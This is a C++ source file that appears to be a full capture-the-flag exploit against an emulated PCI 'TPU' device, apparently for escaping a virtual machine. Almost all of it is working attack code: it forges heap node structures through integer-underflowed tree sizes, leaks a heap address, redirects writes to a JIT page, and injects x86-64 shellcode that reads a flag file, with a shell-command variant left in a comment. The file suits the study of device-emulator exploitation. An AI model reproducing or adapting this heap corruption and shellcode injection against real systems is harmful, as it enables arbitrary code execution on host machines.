#include <assert.h>
#include <algorithm>
#include <stdlib.h>
#include <string.h>
#include <err.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/mman.h>
#include <unistd.h>

// {{{ spec

#define SIZEOF_CSRS 8 * 9
#define SIZEOF_QUEUE (4096)

#define QUEUE_WRAP_BIT (1 << 12)
#define QUEUE_REAL_INDEX(c) (c & (QUEUE_WRAP_BIT - 1))
#define QUEUE_INDEX_MASK (QUEUE_WRAP_BIT * 2 - 1)

enum TPU_CSR {
	TPU_CSR_VERSION,
	TPU_CSR_RESET,
	TPU_CSR_IRQ_STATUS,
	TPU_CSR_CLEAR_IRQ,
	TPU_CSR_CMD_SENT,
	TPU_CSR_CMD_HEAD,
	TPU_CSR_CMD_TAIL,
	TPU_CSR_RSP_HEAD,
	TPU_CSR_RSP_TAIL,
};

enum TPU_REG {
	TPU_R0 = 0,
	TPU_R1 = 1,
	TPU_R2 = 2,

	TPU_REG_END = 16,
};

enum TPU_OP {
	TPU_OP_NEW,
	TPU_OP_SPLIT,
	TPU_OP_MERGE,
	TPU_OP_PRINT,
	TPU_OP_INFO,
	TPU_OP_DELETE,
	TPU_OP_REVERSE,
	TPU_OP_COVER,
	TPU_OP_VERSION,
	TPU_OP_LOAD,

	TPU_OP_END = 16,
};

typedef unsigned long long cmd_type;

struct cmd_element {
	unsigned char count;
	cmd_type inst[];
} __attribute__((packed));
// }}}

#define u64 unsigned long long
#define u32 unsigned int
#define u16 unsigned short
#define u8 unsigned char

#define DEVICE_DIR "/sys/devices/pci0000:00/0000:00:04.0"

u64 thread_heap;

static u64 seed = 0x32f1ac98b15fbacdull;
u64 rand64() {
	seed = seed * 0x139d21737 + 0xdeadface3199ef33ull;
	return seed;
}

struct Node {
  int tid;
  u32 sz;
  u64 hval;
  bool operator<(const struct Node &other) const {
    return hval < other.hval;
  }
};

Node *new_node(int tid, u32 sz) {
  Node *n = (Node *) malloc(sizeof(*n));
  n->tid = tid;
  n->sz = sz;
  n->hval = 0;
  for (int i = 0; i < sz; i++)
    n->hval = std::max(n->hval, rand64());
  return n;
}

struct TPU {
  u64 *csrs;
  u8 *cmd_queue, *rsp_queue, *data;

  u8 inst_cnt;
  u64 cmd_tail, rsp_head;
  u64 inst[128];
  void init() {
    csrs = (typeof(csrs)) map_resource(0, SIZEOF_CSRS);
    cmd_queue = (u8 *) map_resource(1, SIZEOF_QUEUE);
    rsp_queue = (u8 *) map_resource(2, SIZEOF_QUEUE);
    data = (u8 *) map_resource(3, SIZEOF_QUEUE);
    reset();
    printf("Checking TPU resource..");
    assert(csrs[TPU_CSR_VERSION] == 0xd901);
    assert(command_version() == 0xd901);
    puts(" success");
  }

  void reset() {
    csrs[TPU_CSR_RESET] = 1;
    seed = 0x32f1ac98b15fbacdull;
    cmd_tail = 0;
    rsp_head = 0;
  }

  void fetch_rsp(int n, u8 *c) {
    /* if (csrs[TPU_CSR_RSP_TAIL] == rsp_head) */
    /*   usleep(100000); */
    u64 head = rsp_head, tail = csrs[TPU_CSR_RSP_TAIL];
    assert(head != tail);
    for (int i = 0; i < n; i++) {
      assert(head != tail); // no enough bytes?
      if (c)
        c[i] = rsp_queue[QUEUE_REAL_INDEX(head)];
      head = (head + 1) & QUEUE_INDEX_MASK;
    }

    rsp_head = head;
    csrs[TPU_CSR_RSP_HEAD] = head;
  }

  int rsp_info() {
    u8 op;
    int tid;
    fetch_rsp(1, &op);
    assert(op == TPU_OP_INFO);
    fetch_rsp(4, (u8 *)&tid);
    return tid;
  }

  void rsp_print(int sz, void *data) {
    u8 op, _sz;
    fetch_rsp(1, &op);
    assert(op == TPU_OP_PRINT);
    fetch_rsp(1, &_sz); // don't trust this sz
    fetch_rsp(sz, (unsigned char *)data);
    assert(rsp_head == csrs[TPU_CSR_RSP_TAIL]);
  }

#define SS(r, i) ((u64)(r) << i)

  Node *new_tree(int n, int w, void *val) {
    memcpy(data, val, n * w);

    prepare();
    emit(TPU_OP_NEW | SS(TPU_R0, 4) | SS(w, 8) | SS(n, 12));
    emit(TPU_OP_INFO | SS(TPU_R0, 4));
    commit();

    int tid = rsp_info();
    assert(tid >= 0);
    return new_node(tid, n);
  }

  u16 rsp_version() {
    u8 op;
    u16 ver;
    fetch_rsp(1, &op);
    assert(op == TPU_OP_VERSION);
    fetch_rsp(2, (u8 *)&ver);
    return ver;
  }

  u16 command_version() {
    prepare();
    emit(TPU_OP_VERSION);
    commit();
    return rsp_version();
  }

  void *map_resource(int bar, size_t size) {
    char buf[sizeof(DEVICE_DIR) + 20];
    sprintf(buf, "%s/resource%d", DEVICE_DIR, bar);
    int fd = open(buf, O_RDWR);
    if (fd < 0)
      err(1, "open");
    return mmap(0, size, 3, MAP_SHARED, fd, 0);
  }

  void prepare() {
    inst_cnt = 0;
  }

  void emit(u64 code) {
    assert(inst_cnt < 128);

    inst[inst_cnt++] = code;
  }

  void commit() {
    struct cmd_element *cmd = (typeof(cmd)) malloc(sizeof(*cmd) + inst_cnt * sizeof(u64));
    assert(cmd);

    cmd->count = inst_cnt;
    memcpy(cmd->inst, inst, inst_cnt * sizeof(u64));
    push_cmd(cmd);
    free(cmd);
    csrs[TPU_CSR_CMD_SENT] = 1;
    // waiting for ISR done
    usleep(1000);
  }

  void push_cmd(struct cmd_element *cmd) {
    u64 head = csrs[TPU_CSR_CMD_HEAD];
    u64 tail = cmd_tail;
    u32 total = sizeof(*cmd) + cmd->count * sizeof(u64);
    unsigned char *c = (unsigned char *)cmd;
    u32 i;

    for (i = 0; i < total; i++) {
      assert((head ^ tail) != QUEUE_WRAP_BIT);
      cmd_queue[QUEUE_REAL_INDEX(tail)] = c[i];
      tail = (tail + 1) & QUEUE_INDEX_MASK;
    }
    csrs[TPU_CSR_CMD_TAIL] = cmd_tail = tail;
  }

  void merge(int tid1, int tid2) {
    prepare();
    emit(TPU_OP_LOAD | SS(TPU_R0, 4) | SS(tid1, 8));
    emit(TPU_OP_LOAD | SS(TPU_R1, 4) | SS(tid2, 8));
    emit(TPU_OP_MERGE | SS(TPU_R2, 4) | SS(TPU_R0, 8) | SS(TPU_R1, 12));
    commit();
  }

  void split(int tid, u32 x) {
    prepare();
    emit(TPU_OP_LOAD | SS(TPU_R0, 4) | SS(tid, 8));
    emit(TPU_OP_SPLIT | SS(TPU_R0, 4) | SS(x, 8) | SS(TPU_R1, 40) | SS(TPU_R2, 44));
    commit();
  }

  void cover(int tid, u64 val) {
    prepare();
    emit(TPU_OP_LOAD | SS(TPU_R0, 4) | SS(tid, 8));
    emit(TPU_OP_COVER | SS(TPU_R0, 4));
    emit(val);
    commit();
  }

  void print(int tid, int exp_sz, void *data) {
    prepare();
    emit(TPU_OP_LOAD | SS(TPU_R0, 4) | SS(tid, 8));
    emit(TPU_OP_PRINT | SS(TPU_R0, 4));
    commit();

    rsp_print(exp_sz, data);
  }

  void fake_commands(u8 sz) {
    assert(sz > 0);
    prepare();
    for (int i = 0; i < sz; i++)
      emit(0xdeadbe00); // TPU_OP_NEW with w = 0 does nothing
    commit();
  }

  void fake_commands(u8 sz, u64 data[]) {
    prepare();
    for (int i = 0; i < sz; i++)
      emit(data[i]);
    commit();
  }
} tpu;

void setup() {
  tpu.init();
}

#define NN 32
Node pool[NN];
Node big;
/* prepare NN nodes with hval < max_hval */
void prepare_pool(u64 max_hval) {
  puts("Preparing pool..");
  int i = 0, cnt = 0;
  while (i < NN) {
    Node *n = tpu.new_tree(1, 1, &i);
    cnt++;
    if (n->hval < max_hval)
      pool[i++] = *n;
    else
      big = *n;
    free(n);
  }
  std::sort(pool, pool + NN);
  assert(cnt > i); // make sure we have the "big" one
  printf("%d nodes allocated, %d nodes go to pool\n", cnt, i);
}

int construct_3() {
  /* create a node with sz = -3 */
  const Node sz1 = pool[0];

  puts(__func__);
  for (int i = 1; i < NN; i++) {
    tpu.merge(pool[i].tid, pool[i].tid);
    ++pool[i].sz;
    tpu.merge(sz1.tid, pool[i].tid);
    tpu.split(pool[i].tid, sz1.sz);
    pool[i].sz = sz1.sz + pool[i].sz + 2;
  }
  int lastn = 30; // pool[30] is 2**32 - 2**29 - 2
  assert(lastn < NN);
  // 5, 12, 26, 54, 110, ... : 2**n - 2**(n-3) - 2
  // 3,  4,  5,  6,   7, ...
  // -> 2**32 - 2**2 - 2 = -6
  for (int i = 1; i < lastn; i++) {
    for (int j = i + 1; j <= lastn; j++) {
      tpu.merge(pool[i].tid, pool[j].tid);
      tpu.split(pool[j].tid, pool[i].sz);
      pool[j].sz = pool[i].sz + pool[j].sz + 2;
    }
  }
  for (int i = lastn - 3; i >= 3; i -= 3) {
    tpu.merge(pool[i].tid, pool[lastn].tid);
    tpu.split(pool[lastn].tid, pool[i].sz);
    pool[lastn].sz = pool[i].sz + pool[lastn].sz + 2;
  }
  tpu.merge(sz1.tid, pool[lastn].tid);
  tpu.split(pool[lastn].tid, sz1.sz);
  pool[lastn].sz = sz1.sz + pool[lastn].sz + 2;

  return pool[lastn].tid;
}

// make n->sz == -16
void make_16(Node *n, int tid_n3) {
  tpu.merge(n->tid, n->tid);
  n->sz++;
  for (int i = 2; i != -1; i--) {
    tpu.merge(tid_n3, n->tid);
    tpu.split(n->tid, -3);
  }
  // now n->sz = -1
  tpu.merge(tid_n3, n->tid); // sz = -3
  tpu.split(n->tid, -2); // cut loop, sz = -2
  tpu.merge(n->tid, n->tid); // sz = -4
  tpu.split(n->tid, -3); // sz = -3

  for (int i = -3; i != -16; i--) {
    tpu.merge(tid_n3, n->tid);
    tpu.split(n->tid, -3);
  }
  puts("size -16 created");
}

typedef struct TPUNode {
	u64 l, r;
	u64 hval; int w; int sz;
	u64 alive; u64 data;
	int tid, idx; int rev, covered; // char pad[6];
	uint64_t cover_val;
} TPUNode;

void make_264() {
  const int N = 264;
  unsigned char overflow[N] = {};
  static Node nn[N];
  nn[0] = big;
  for (int i = 1; i < N; i++) {
    Node *n = tpu.new_tree(1, 1, overflow);
    nn[i] = *n;
    free(n);
  }
  std::sort(nn, nn + N);
  TPUNode fake_node = {
    .l = 0, .r = 0,
    .hval = 0x1000000000000000ull, .w = 1, .sz = 1,
    .alive = 1, .data = 0x0d,
    .tid = 0, .idx = 0, .rev = 0, .covered = 0,
    .cover_val = 0
  };
  /*
   *   l         r
   *  hval       w, sz
   *  alive      data
   *  tid,idx    rev, covered
   *  cover_val
   *                 l
   *   r             hval
   *   w, sz         alive
   *   data          tid, idx
   *   rev, covered  cover_val
   */
  memcpy(overflow + 201, &fake_node, 62);
  std::reverse(overflow, overflow + N);
  for (int i = 0; i < N; i++)
    if (overflow[i] != 0)
      tpu.cover(nn[i].tid, overflow[i]);
  for (int i = 0; i < N - 1; i++)
    tpu.merge(nn[i].tid, nn[N-1].tid);
  big = nn[N-1];
  printf("big.tid = %d\n", big.tid);
}

void update_hack_node(TPUNode *node) {
  u64 cmd[17] = {};
  memcpy(cmd + 2, node, sizeof(*node));
  tpu.fake_commands(17, cmd);
}

void exploit() {
  unsigned char data[4096] = {12, 176, 206, 250};
  tpu.new_tree(5, 8, data);
  int c = 0x78;
  tpu.fake_commands(248 / 8); // to invoke g_free(g_malloc(sz * 8))
  Node *to_of = tpu.new_tree(1, 1, &c); // right after the 256 chunk
  /* tpu.print(to_of->tid, NULL); // PoC of DoS */
  prepare_pool(to_of->hval);
  int tid_n3 = construct_3();
  make_16(to_of, tid_n3);
  make_264();
  tpu.merge(big.tid, to_of->tid); // now big.sz == 264 - 16
  tpu.print(big.tid, 266, NULL); // big.sz is updated to 266 after print's pull
  // now:
  // to_of
  //    \
  //    fake_node(@0x0d78)
  // fake_node's cover_val is to_of->r == &fake_node

  // split big and to_of, big.sz should be 266 after print()
  tpu.split(big.tid, 264);
  tpu.split(big.tid, 264 - 245); // let big's sz be 245
  Node *l = tpu.new_tree(1, 1, data);
  assert(l->hval < to_of->hval);
  tpu.merge(l->tid, to_of->tid);
  tpu.cover(big.tid, 0);
  tpu.merge(big.tid, to_of->tid); // 248
  tpu.print(big.tid, 247, data);
  thread_heap = (*(u64 *) &data[240]) - 0xd78;
  printf("thread_heap @ %#llx\n", thread_heap);
  // split big and to_of
  tpu.split(big.tid, 245);
  // to_of->l now points to top of arena..
  // to_of->l has size 0, merge an extra node to make us able to cut it out
  free(l); l = tpu.new_tree(1, 1, data);
  assert(l->hval < to_of->hval);
  tpu.merge(l->tid, to_of->tid);
  tpu.split(to_of->tid, 1);

  // prepare a nice node
  TPUNode hack_node = {
    .l = 0, .r = 0,
    .hval = 0x0f00000000000000ull, .w = 1, .sz = 1,
    .alive = 1, .data = 0xdeadbeef,
    .tid = 0, .idx = 0, .rev = 0, .covered = 0,
    .cover_val = 0
  };
  update_hack_node(&hack_node);
  u64 hack_node_at = thread_heap + 0x6b30;

  u64 cmd[248 / 8] = {};
  // let fake_node->l points to hack_node
  cmd[200 / 8] = hack_node_at;
  tpu.fake_commands(248 / 8, cmd);
  tpu.print(to_of->tid, 3, data);
  assert(data[1] == 0xef);
  // discard fake node
  tpu.split(to_of->tid, 2);
  // now to_of->r is hack_node
  hack_node.l = thread_heap + 0x990; // inside tcache
  update_hack_node(&hack_node);
  u64 jit_page = thread_heap + 0x20000000;
  printf("guess jit_page @ %#llx\n", jit_page);
  tpu.cover(to_of->tid, jit_page + 0x10);
  tpu.print(to_of->tid, 3, data); // to push

  u64 stk = thread_heap + 0x1000; // movabs rsp, stk
  unsigned char sc[0x168] = {
    144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144,
    144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144,
    144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144,
    144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 
    144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144,
    144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144,
    144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144,
    144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144,
    144, 144, 144, 144, 144, 144, 144, 144,
    'H', 0xbc, 0, 0, 0, 0, 0, 0, 0, 0,
    /* 0xf4, // halt */
    104, 102, 108, 97, 103, 106, 2, 88, 72, 137, 231, 49, 246, 153, 15, 5, 106, 2, 95, 72, 137, 198, 106, 40, 88, 65, 186, 255, 255, 255, 127, 153, 15, 5, // cat('flag', fd: 2)
    /* 104, 63, 39, 51, 1, 129, 52, 36, 1, 1, 1, 1, 72, 184, 116, 32, 102, 108, 97, 103, 32, 49, 80, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 114, 105, 1, 44, 98, 1, 98, 96, 72, 49, 4, 36, 49, 246, 86, 106, 14, 94, 72, 1, 230, 86, 106, 19, 94, 72, 1, 230, 86, 106, 24, 94, 72, 1, 230, 86, 72, 137, 230, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 99, 104, 111, 46, 114, 105, 1, 72, 49, 4, 36, 106, 59, 88, 72, 137, 231, 153, 15, 5, // sh -c 'cat /flag 1>&2' */
  };
  memcpy(sc + 0x88 + 2, &stk, 8);
  u64 load = TPU_OP_LOAD | SS(TPU_R0, 4) | SS(pool[3].tid, 8);
  u64 print = TPU_OP_PRINT | SS(TPU_R0, 4);
  memcpy(sc + 0x100, &load, 8);
  memcpy(sc + 0x100 + 8, &print, 8); // should inf loop
  tpu.fake_commands(0x168 / 8, (u64*)sc);
}

int main() {
  setup();
  exploit();
  puts("fail..");
  return 0;
}
